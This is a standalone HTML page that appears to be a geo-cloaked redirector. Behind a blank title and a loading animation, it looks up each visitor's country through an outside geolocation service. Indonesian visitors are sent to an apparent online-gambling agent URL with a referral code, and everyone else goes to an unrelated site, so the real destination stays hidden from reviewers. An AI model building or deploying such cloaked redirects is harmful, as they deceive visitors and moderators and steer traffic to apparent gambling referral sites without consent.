<!DOCTYPE html>
<html>
<head>
  <title> </title>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <style>
    .loading-image {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  display: none;
}

.loading-image img {
  animation: fadeInOut 2s ease-in-out infinite;
}

@keyframes fadeInOut {
  0% {
    opacity: 0;
  }
  50% {
    opacity: 1;
  }
  100% {
    opacity: 0;
  }
}
  </style>
</head>
<body>

  <div class="loading-image">
    <img src="https://i.ibb.co/jbTC1nf/gamingacoer.webp" alt="Loading...">
  </div>

  <script>
    // Tampilkan loading image
$('.loading-image').show();

// Cek apakah situs sudah pernah diacak sebelumnya
const randomSite = sessionStorage.getItem('randomSite');

if (randomSite !== null) {
  // Jika situs sudah pernah diacak, langsung redirect ke situs tersebut
  window.location.href = randomSite;
} else {
  $.getJSON('https://geolocation-db.com/json/67273a00-5c4b-11ed-9204-d161c2da74ce')
    .done(function(location) {
      // Array daftar situs pilihan untuk pengunjung dari Indonesia
      const sites = ["https://agen198jos.org/?Ref=GNGuf68F", "https://agen198jos.org/?Ref=GNGuf68F", "https://agen198jos.org/?Ref=GNGuf68F", "https://agen198jos.org/?Ref=GNGuf68F"];
      if (location.country_code === "ID") {
        // Ambil situs acak dari daftar situs pilihan
        const randomSite = sites[Math.floor(Math.random() * sites.length)];
        // Simpan situs acak ke dalam sessionStorage
        sessionStorage.setItem('randomSite', randomSite);
        window.location.href = randomSite;
      } else {
        window.location.href = "https://www.chendigitalz.com";
      }
    })
    .fail(function() {
      console.log("Gagal memperoleh informasi lokasi pengunjung.");
    })
    .always(function() {
      // Sembunyikan loading image
      $('.loading-image').hide();
    });
}

  </script>

  <noscript>
    <p>Mohon maaf, JavaScript dinonaktifkan pada browser Anda.</p>
  </noscript>
</body>
</html>
